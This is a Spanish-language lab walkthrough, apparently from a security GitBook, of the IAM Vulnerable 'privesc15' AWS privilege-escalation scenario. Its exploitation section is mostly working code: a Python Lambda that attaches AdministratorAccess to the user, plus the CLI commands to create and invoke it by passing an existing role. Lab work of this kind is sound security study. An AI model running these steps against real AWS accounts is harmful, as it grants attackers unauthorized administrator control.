---
description: 'Lab: IAM vulnerable'
---

# PassExistingRoleToNewLambdaThenInvoke

## Laboratorio

En este apartado se observará el ejemplo utilizando el laboratorio IAM vulnerable con el escenario privesc15

{% embed url="https://bishopfox.com/blog/privilege-escalation-in-aws" %}
Lab: IAM - Vulnerable | Escenario: privesc15
{% endembed %}

Un atacante con los permisos <mark style="color:green;">iam:PassRole</mark> , <mark style="color:green;">lambda:CreateFunction</mark> y <mark style="color:green;">lambda:InvokeFunction</mark> puede escalar privilegios pasando un rol de IAM existente a una nueva función de Lambda que incluye código para importar la biblioteca de AWS relevante para el lenguaje de programación de su elección, y luego usándola para realizar las acciones de su elección. Para este ejercicio se simulará que es una auditoria post autenticación (habiendo obtenido las credenciales por algún otro medio previo).

### Configuración Inicial

Usuario del laboratorio: privesc15-PassExistingRoleToNewLambdaThenInvoke-user

La cuenta de AWS debe contener un rol existente que incluya el permiso iam:AttachUserPolicy y las funciones lambda deben poder asumir este rol.

{% code title="assumeRolePolicy.json" overflow="wrap" %}
```json
{
     "Version": "2012-10-17",
     "Statement": [
         {
            "Sid": "VisualEditor0",
             "Effect": "Allow",
             "Action": "iam:AttachUserPolicy",
             "Resource": "arn:aws:iam::*:user/*"
         }
     ]
}
```
{% endcode %}

Luego las políticas asociadas al usuario deben ser las siguientes:

<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption><p>Permisos mínimos para escalar privilegios </p></figcaption></figure>

Posterior mente generar llaves e acceso desde cuenta administrador para interactuar con el usuario en AWS CLI y configurar un perfil.



### Explotación

#### Paso 1

En este laboratorio, se tiene que iniciar utilizando el permiso <mark style="color:green;">**lambda:Createfunction**</mark> para crear una función lambda maliciosa en Python que tendrá el código para adjuntar una política de altos privilegios al usuario inicial _privesc15_.

<pre class="language-python" data-title="code.py" data-overflow="wrap"><code class="lang-python">import boto3

def lambda_handler(event, context):
    # crea un cliente de IAM usando la biblioteca Boto3
    client = boto3.client('iam')
    
    # adjunta la política "AdministratorAccess" al usuario 
<strong>    response = client.attach_user_policy(UserName='privesc15-PassExistingRoleToNewLambdaThenInvoke-user',
</strong><strong>    PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
</strong>    
    # devuelve la respuesta de la API de IAM de AWS
    return response

</code></pre>

Para subir el archivo con el permiso <mark style="color:green;">**lambda:Createfunction**</mark> es necesario comprimir el archivo en formato zip con el nombre <mark style="color:green;">**function.zip**</mark>, después ejecutar el siguiente comando:

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>aws lambda create-function --function-name privesc --runtime python3.6 --role arn:aws:iam::037572360634:role/privesc-high-role-Lambda --handler code.lambda_handler --zip-file fileb://function.zip --region us-east-2 --profile privesc15
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

#### Paso 2

Llamar la función maliciosa aprovechando el privilegio de <mark style="color:green;">**lambda:InvokeFunction**</mark> para invocar dicha función y que finalmente el usuario inicial adquiera el rol de administrador.

{% code overflow="wrap" %}
```bash
aws lambda invoke --function-name privesc output.txt --region us-east-2 --profile privesc15
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

Con estos pasos ya se habrá ejecutado la escalación de privilegios, se puede observar con el siguiente comando:

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>







